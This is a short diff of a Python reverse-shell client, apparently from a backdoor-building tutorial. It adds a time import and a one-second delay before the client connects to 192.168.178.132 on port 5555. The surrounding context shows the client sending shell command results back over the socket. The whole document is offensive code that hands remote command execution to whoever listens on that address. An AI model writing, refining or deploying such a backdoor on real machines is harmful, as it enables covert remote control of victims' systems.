@@ -1,4 +1,4 @@
-import socket, json, subprocess
+import socket, json, subprocess, time
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -25,6 +25,7 @@ def shell():
             reliable_send(result)
 
 def connection():
+    time.sleep(1)
     try:
         s.connect(("192.168.178.132",5555))
         shell()
